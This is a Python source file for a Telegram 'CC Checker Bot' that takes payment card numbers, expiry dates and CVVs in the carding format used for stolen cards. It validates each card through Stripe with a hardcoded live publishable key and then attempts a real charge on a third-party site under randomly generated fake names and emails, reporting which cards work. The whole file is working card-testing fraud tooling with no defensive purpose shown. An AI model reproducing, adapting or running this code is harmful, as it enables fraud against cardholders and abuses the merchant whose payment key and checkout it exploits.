import json
import time
import random
import string
import hashlib
import requests
import re
import telebot

config = {
    "authorized_users": [bot_id],
    "support_group": group_id,
    "support_username": "username",
    "owner": "username",
    "bot_token": "bot_token_key"
}

bot = telebot.TeleBot(config['bot_token'])

def save_user(user_id):
    with open("users.txt", "a+") as f:
        f.seek(0)
        users = f.read().splitlines()
        if str(user_id) not in users:
            f.write(f"{user_id}\n")

def is_registered(user_id):
    try:
        with open("users.txt", "r") as f:
            users = f.read().splitlines()
            return str(user_id) in users
    except FileNotFoundError:
        return False

def is_authorized(user_id):
    return user_id in config['authorized_users']

def extract_cc(text):
    patterns = [
        r"(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3})",
        r"(\d{16})\s+(\d{2})\s+(\d{2,4})\s+(\d{3})",
        r"(\d{16})\|(\d{2})/(\d{2,4})/(\d{3})",
        r"(\d{16})/(\d{2})/(\d{2})/(\d{3})"
    ]

    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return {
                "cc": match.group(1),
                "month": match.group(2),
                "year": match.group(3)[-2:] if len(match.group(3)) == 4 else match.group(3),
                "cvv": match.group(4)
            }
    return None

def generate_random_data():
    firstname = "".join(random.choices(string.ascii_lowercase, k=8)).capitalize()
    lastname = "".join(random.choices(string.ascii_lowercase, k=8)).capitalize()
    email = f"{firstname.lower()}{random.randint(100, 999)}@gmail.com"
    return {"firstname": firstname, "lastname": lastname, "email": email}

def check_cc(cc, month, year, cvv):
    random_data = generate_random_data()

    # First Request: Generate Stripe Token
    stripe_url = "https://api.stripe.com/v1/tokens"
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0"
    }
    payload = {
        "card[number]": cc,
        "card[exp_month]": month,
        "card[exp_year]": year,
        "card[cvc]": cvv,
        "card[name]": f"{random_data['firstname']} {random_data['lastname']}",
        "key": "pk_live_7brFCCZ0CF9HUzYyJ3a7aMj2"
    }

    response = requests.post(stripe_url, headers=headers, data=payload)
    token_response = response.json()

    if "id" not in token_response:
        return {"success": False, "message": "Token generation failed", "error": token_response.get("error", {}).get("message", "Unknown error")}

    # Second Request: Attempt Charge
    charge_url = "https://frethub.com/register/FJKfhw"
    charge_data = {
        "nonce": hashlib.md5(str(random.random()).encode()).hexdigest(),
        "stripe_action": "charge",
        "charge_type": "new",
        "subscription": "1",
        "first_name": random_data['firstname'],
        "last_name": random_data['lastname'],
        "email": random_data['email'],
        "cc_number": cc,
        "cc_expmonth": month,
        "cc_expyear": year,
        "cc_cvc": cvv,
        "stripeToken": token_response['id']
    }
    charge_response = requests.post(charge_url, headers=headers, data=charge_data).text

    if "status=success" in charge_response:
        return {"success": True, "message": "Card charged successfully"}
    else:
        error_message = "Card declined"
        if "reason=" in charge_response:
            error_message = charge_response.split("reason=")[1].split("&")[0]
        return {"success": False, "message": error_message}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = f"""
    Welcome to CC Checker Bot

    Commands:
    /register - Register your account
    /chk <card> - Check a card

    Group: {config['support_username']}
    """
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['register'])
def register_user(message):
    user_id = message.from_user.id
    save_user(user_id)
    bot.reply_to(message, "Registration successful!")

@bot.message_handler(commands=['chk'])
def check_card(message):
    user_id = message.from_user.id

    if not is_registered(user_id):
        bot.reply_to(message, "Please register first using /register")
        return

    text = message.text
    cc_data = extract_cc(text)
    if not cc_data:
        bot.reply_to(message, "Invalid card format! Use xxxxxxxxxxxxxxxx|mm|yy|cvv.")
        return

    check = check_cc(cc_data['cc'], cc_data['month'], cc_data['year'], cc_data['cvv'])
    response_message = f"CC Details: {cc_data['cc']} | Expiry: {cc_data['month']}/{cc_data['year']} | CVV: {cc_data['cvv']} | Status: {'✅' if check['success'] else '❌'} {check['message']}"
    bot.reply_to(message, response_message)

if __name__ == "__main__":
    bot.polling(none_stop=True)
